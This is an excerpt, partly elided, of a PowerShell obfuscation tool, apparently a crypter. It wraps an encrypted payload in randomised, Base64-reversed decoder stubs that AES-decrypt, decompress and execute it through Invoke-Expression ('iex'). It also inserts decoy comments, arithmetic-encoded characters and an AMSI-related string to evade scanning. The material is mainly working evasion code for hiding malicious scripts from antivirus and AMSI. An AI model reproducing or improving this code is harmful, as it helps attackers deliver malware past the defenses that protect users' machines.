...
function linefuse {
    param ([int]$keycount = 5,[int]$minkeylength = 20,[int]$maxkeylength = 40)
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    $alphabetarray = $alphabet.ToCharArray()
    $alphabetsize = $alphabetarray.Length
    $nvrandomkeys = @()
    ...
    process {
        ...
        for ($i = 1; $i -le $iterations; $i++) {
            ...
            $metadatalines = @(
                ...
                ""
                "#lnvoke-expression $(confusekey)"
            )
            $metadata = ($metadataLines -join "`n") + "`n"
            $amsi = '([TeXt.EnCoDiNg]::uTf8.gEtstRInG([CoNvErT]::frOMbASe64stRiNg("")))|iex' + "`r`n"
            $nvstubpre = ''
            $nvcodealtna  = @()
            $nvcodealtna += '${2} = [cOnvert]::{149}("{0}")' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${3} = [CoNVerT]::{150}("{1}")' + " #$(linefuse)" + "`r`n"
            ...
            $nvcodealtna += '${4} = &(gcM *W-o*T) "${33}"' + " #$(linefuse)" + "`r`n"
            $nvcodealtna_shuffled = $nvcodealtna 
            $nvstubpre += $nvcodealtna_shuffled -join ''
            $nvstubpre += '#lnvoke-webrequest -uri {10}' + "`r`n"

            $nvcodealtna  = @()
            $nvcodealtna += '${16} = "==wYCNmO60VZE9UTyVGSwl0YukHaQFmcH9Gdwlncj5Se0lkUVNURz5STFR1c5N3W"' + " #$(linefuse)" + "`r`n" # [sysTEM.sECURIty.cryptoGraPhy.cIpHerMODe]::cBc
            ...
            #$nvcodealtna += '${4}.ModE = [SYSTem.SecUriTy.CrYPTOGrapHY.cIpheRmodE]::'+$CIpHerMoDE + " #$(linefuse)" + "`r`n"
            ...
            #$nvcodealtna += '${4}.pAddINg = [sYsTem.SECuRIty.cRYptOGRaPhy.PaDdiNgMoDe]::'+$paddingmode + " #$(linefuse)" + "`r`n"
            ...
            $nvstubpre += $nvcodealtna -join ''
            $nvstubpre += '#[cOnvert]::frOMbASe64strlNg({11}' + "`r`n"
            
            $nvcodealtna  = @()
            $nvcodealtna += '${51} = "==QbhVmUUNXeS9WTl1kLPlmLNVGdTl1c"' + " #$(linefuse)" + "`r`n" # sYSteM.iO.MeMoRysTReam
            ...
            $nvcodealtna += '${6} = &(gcM *W-O*t) ${54}(,${4}.{148}().{173}(${2},16,${2}.LeNgTh-16))' + " #$(linefuse)" + "`r`n"
            $nvcodealtna += '${7} = &(gCM *W-o*T) ${54}' + " #$(linefuse)" + "`r`n"
            $nvstubpre += $nvcodealtna -join ''
            $nvstubpre += '#instalI-module {12}' + "`r`n"
            
            $nvcodealtna = @()
            if ($compressiontype -eq "Gzip") {
                $nvstubpre += '${51} = "=0WQFJHVTBXa6dkLu9UazNXZyBXbvNmLPlmLtVEVzl1U"' + " #$(linefuse)" + "`r`n" # SYsTEm.iO.compressiOn.GzipSTrEAm
                ...
                $nvstubpre += '${54} = "=0VRk9UbO9WazNVRSBVTvNmLu9USzNVZyBVbvNmLvl2W"' + " #$(linefuse)" + "`r`n" # [io.comPreSsIOn.coMPRESsioNmOdE]
                ...
                $nvstubpre += '${57} = "==wcTVkcw12bDVEZ"' + " #$(linefuse)" + "`r`n" # dEComprESs
                ...
                $nvstubpre += '${5} = &(gCM *w-O*t) ${29} ${6}, (${28}::${27})' + " #$(linefuse)" + "`r`n"
                #$nvstubpre += '${5} = &(GCM *w-o*t) SYsTEm.iO.compressiOn.GzipSTrEAm ${6}, ([io.comPreSsIOn.coMPRESsioNmOdE]::DecoMPREss)' + " #$(linefuse)" + "`r`n"
            } elseif ( $compressiontype -eq "Deflate") {
                $nvstubpre += '${51} = "=0WYlJHVzVEVBxkRFRkLO9USTNXZyBVbvNmLPlmLNVEVzl1c"' + " #$(linefuse)" + "`r`n" # sYsTEM.iO.comPresSION.DEFLATEsTream
                ...
                $nvstubpre += '${5} = &(GcM *w-o*T) ${29} ${6}, (${28}::${27})' + " #$(linefuse)" + "`r`n"
                #$nvstubpre += '${5} = &(GCM *w-o*t) sYsTEM.iO.comPresSION.DEFLATEsTream ${6}, ([iO.coMpReSsIoN.COmpRessiOnModE]::dEComprESs)' + " #$(linefuse)" + "`r`n"
            }
            ...
            $nvcodealtna  = @()
            $nvcodealtna += '${34} = "W1RlWFQuRW5DT2RJbkdd"' + " #$(linefuse)" + "`r`n" # "[TeXT.EnCOdInG]"
            ...
            $nvcodealtna += '${43} = "n5WayR3U0V2R"' + " #$(linefuse)" + "`r`n" # "GetStriNG"
            ...
            $nvcodealtna += '${47} = "==QWBJlUB9Ed"' + " #$(linefuse)" + "`r`n" # "tOARRAY"
            ...
            # works
            $nvcode = $nvstubpre -f ($b64encrypted, $b64key, # 0-1
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom),(nvrandom), (nvrandom), # 2-8
            (confusekey), (confusekey),(confusekey), (confusekey), (confusekey),(confusekey), # 9-14
            (nvrandom), (nvrandom),(nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom), # 15-21
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom), # 22-26
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom), # 27-31
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom), # 32-35
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom), # 37-41
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom), # 42-46
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom), # 47-51
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom), # 52-56
            (nvrandom), (nvrandom), (nvrandom), (nvrandom), (nvrandom), # 57-61
            (nvrandom),(confusekey), (confusekey), (confusekey), # 62-65
            (reverseobf),(reverseobf),(reverseobf),(reverseobf),(reverseobf),(reverseobf), # 66-71
            (reverseobf),(reverseobf),(reverseobf),(reverseobf),(reverseobf), #72-76
            (reverseobf),(reverseobf),(reverseobf),(reverseobf),(reverseobf), #77-81
            (chararrayobf),(chararrayobf),(chararrayobf),(chararrayobf),(chararrayobf),(chararrayobf), # 82-87
            (chararrayobf),(chararrayobf),(chararrayobf),(chararrayobf),(chararrayobf), #88-92
            (chararrayobf),(chararrayobf),(chararrayobf),(chararrayobf),(chararrayobf), #93-97
            (utfobf),(utfobf),(utfobf),(utfobf),(utfobf),(utfobf), # 98-103
            (utfobf),(utfobf),(utfobf),(utfobf),(utfobf), #104-108
            (utfobf),(utfobf),(utfobf),(utfobf),(utfobf),(utfobf),(utfobf), #109-115
            (getstringobf),(getstringobf),(getstringobf),(getstringobf),(getstringobf),(getstringobf), # 116-121
            (getstringobf),(getstringobf),(getstringobf),(getstringobf),(getstringobf), #122-126
            (getstringobf),(getstringobf),(getstringobf),(getstringobf),(getstringobf),(getstringobf), #127-132
            (obfcreate),(obfcreate),(obfcreate),(obfcreate),(obfcreate),(obfcreate),(obfcreate),(obfcreate), #133-140
            (keyobf),(keysizeobf),(ivobf),(copytoobf),(closeobf),(closeobf),(disposeobf),(createdecr), #141-148
            (b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf),(b64obf), #149-167
            (paddingobf),(paddingobf),(paddingobf),(paddingobf),(blocksizeobf),(transformobf),(modeobf)) #168-174
            log "[+]" "Applied $i layer" -HighlightColor Green;if ($NV -notmatch '\!\*') {$null=$null}else{exit}
        }
        ...
        function mathobf {
            ...
            foreach ($nvtarglsingle in $nvtargl) {
                ...
                $modchar = $added -join ","
                $aA = @("a", "A") | Get-random;$aC = @("c", "C") | Get-random;$aE = @("e", "E") | Get-random;$aG = @("g", "G") | Get-random;$aH = @("h", "H") | Get-random;$aM = @("m", "M") | Get-random;$aR = @("r", "R") | Get-random;$aX = @("x", "X") | Get-random
                $nviex = @(
                    '([char]((5591 - 1917 - 703 - 2866))+[char](((-76 -Band 1357) + (-76 -Bor 1357) + 7835 - 9015))+[char](((11229 -Band 1042) + (11229 -Bor 1042) - 3467 - 8684)))',
                    '([char](((-14316 -Band 6651) + (-14316 -Bor 6651) + 5280 + 2458))+[char](((13444 -Band 539) + (13444 -Bor 539) - 4849 - 9033))+[char](((-6259 -Band 6079) + (-6259 -Bor 6079) - 7830 + 8098)))',
                    '([char](((-20558 -Band 9226) + (-20558 -Bor 9226) + 4827 + 6578))+[char](((126 -Band 3024) + (126 -Bor 3024) - 7285 + 4204))+[char]((10888 - 3219 + 2090 - 9671)))',
            ...
            if ($modifiedc -eq 77) {log "[~]" "All patterns found" -HighlightColor Gray
